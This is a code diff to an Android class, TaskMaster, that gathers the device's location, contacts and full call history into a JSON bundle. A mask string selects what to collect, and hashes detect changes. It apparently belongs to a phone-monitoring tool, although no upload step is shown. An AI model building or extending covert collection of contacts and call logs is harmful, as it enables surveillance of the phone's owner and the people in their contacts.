@@ -26,6 +26,7 @@ import android.provider.MediaStore;
 import android.util.Base64;
 import android.util.Log;
 
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -60,11 +61,17 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         String[] hashes = maskHash2[1].split(":");
 
         JSONObject bulkData = new JSONObject();
-        for (int i=0; i<maskHash2.length; i++) {
+        for (int i = 0; i < maskHash2[0].length(); i++) {
             if (maskHash2[0].charAt(i) == '1') {
                 switch (i) {
                     case 0:
                         getSmartphoneLocation(bulkData, hashes[i]);
+                        break;
+                    case 1:
+                        getContacts(bulkData, hashes[i]);
+                        break;
+                    case 2:
+                        getCallHistory(bulkData, hashes[i]);
                         break;
                 }
             }
@@ -165,12 +172,12 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         c.close();
     }
 
-    private void getContacts(JSONObject bulkData) {
+    private void getContacts(JSONObject bulkData, String hash) {
         List<ContactModel> list = new ArrayList<>();
         ContentResolver contentResolver = params.getContentResolver();
         Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
-        if (cursor.getCount() > 0) {
+        if (cursor != null) {
             while (cursor.moveToNext()) {
                 String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                 if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
@@ -193,17 +200,16 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                     if (inputStream != null) {
                         photo = BitmapFactory.decodeStream(inputStream);
                     }
-                    while (cursorInfo.moveToNext()) {
-                        ContactModel info = new ContactModel();
-                        info.id = id;
-                        info.name = cursor.getString(cursor.getColumnIndex(ContactsContract.
-                                Contacts.DISPLAY_NAME));
-                        info.mobileNumber = cursorInfo.getString(cursorInfo.
-                                getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        info.photo = photo;
-                        info.photoURI = pURI;
-                        list.add(info);
-                    }
+                    cursorInfo.moveToFirst();
+                    ContactModel info = new ContactModel();
+                    info.id = id;
+                    info.name = cursor.getString(cursor.getColumnIndex(ContactsContract.
+                            Contacts.DISPLAY_NAME));
+                    info.mobileNumber = cursorInfo.getString(cursorInfo.
+                            getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    info.photo = photo;
+                    info.photoURI = pURI;
+                    list.add(info);
 
                     cursorInfo.close();
                 }
@@ -212,10 +218,8 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getCallHistory(JSONObject bulkData) {
+    private void getCallHistory(JSONObject bulkData, String hash) {
         try {
-            List<String> strings = new ArrayList<>();
-
             ContentResolver contentResolver = params.getContentResolver();
             Cursor managedCursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null,
                     null, null, null);
@@ -224,39 +228,44 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
             int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
             int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
 
+            JSONObject callHistory = new JSONObject();
+            JSONArray informationArray = new JSONArray();
             while (managedCursor.moveToNext()) {
-                StringBuffer sb = new StringBuffer();
-                sb.append("Call Details :");
-                String phNumber = managedCursor.getString(number);
+                JSONObject information = new JSONObject();
+                information.put("Number", managedCursor.getString(number));
+                information.put("Date", managedCursor.getString(date));
+                information.put("Duration", managedCursor.getString(duration));
+
                 String callType = managedCursor.getString(type);
-                String callDate = managedCursor.getString(date);
-                Date callDayTime = new Date(Long.valueOf(callDate));
-                String callDuration = managedCursor.getString(duration);
-                String dir = null;
                 int dircode = Integer.parseInt(callType);
                 switch (dircode) {
                     case CallLog.Calls.OUTGOING_TYPE:
-                        dir = "OUTGOING";
+                         information.put("Direction", "OUTGOING");
                         break;
 
                     case CallLog.Calls.INCOMING_TYPE:
-                        dir = "INCOMING";
+                        information.put("Direction", "INCOMING");
                         break;
 
                     case CallLog.Calls.MISSED_TYPE:
-                        dir = "MISSED";
+                        information.put("Direction", "MISSED");
                         break;
                 }
-                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
-                        + dir + " \nCall Date:--- " + callDayTime
-                        + " \nCall duration in sec :--- " + callDuration);
-                sb.append("\n----------------------------------");
-                strings.add(sb.toString());
+
+                informationArray.put(information);
             }
             managedCursor.close();
 
+            callHistory.put("Calls", informationArray);
+            if (informationArray.hashCode() != Integer.parseInt(hash)) {
+                callHistory.put("Hash", informationArray.hashCode());
+                bulkData.put("CallHistory", callHistory);
+            }
+
         } catch (SecurityException ex) {
             Log.d("CALL LOG EX", ex.getMessage());
+        } catch (JSONException e) {
+            e.printStackTrace();
         }
     }
 
